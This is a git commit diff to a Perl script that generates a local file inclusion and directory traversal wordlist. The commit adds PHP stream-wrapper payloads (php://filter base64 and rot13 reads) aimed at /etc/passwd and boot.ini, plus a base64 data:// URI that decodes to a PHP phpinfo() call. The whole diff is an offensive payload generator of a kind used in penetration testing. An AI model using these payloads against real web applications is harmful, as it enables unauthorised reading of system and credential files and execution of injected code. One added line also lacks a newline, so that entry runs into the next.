fceec5752261f5a8e5d473960873352496a5654e
alecjmaly <alecjmaly@gmail.com>
2022-02-14 10:07:46 -0500

    updated

--- tools/lfi_directory_traversal/generate.pl
+++ tools/lfi_directory_traversal/generate.pl
@@ -12,10 +12,17 @@ my @files = ("/etc/passwd", "boot.ini");
 #output file
 open(FH, '>', "lfi_directory_traversal_wordlist.txt") or die $!;
 
-
 $counter = 0;
 foreach $file (@files) {
     print FH $file . "\n"; # output to file
+    print FH "php://filter/convert.base64-encode/resource=".$file."\n";
+    print FH "data:text/plain,hello world\n";
+    print FH "php://filter/resource=".$file."\n";
+    print FH "php://filter/read=string.rot13/resource=".$file."\n"; 
+    print FH "php://filter/convert.base64-encode/resource=".$file."\n";
+    print FH "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==";
+
+
     @traversals = TraversalEngine("", $min_deep, $deep, $file);
     foreach $trav (@traversals) {
         print FH $trav . "\n"; # output to file
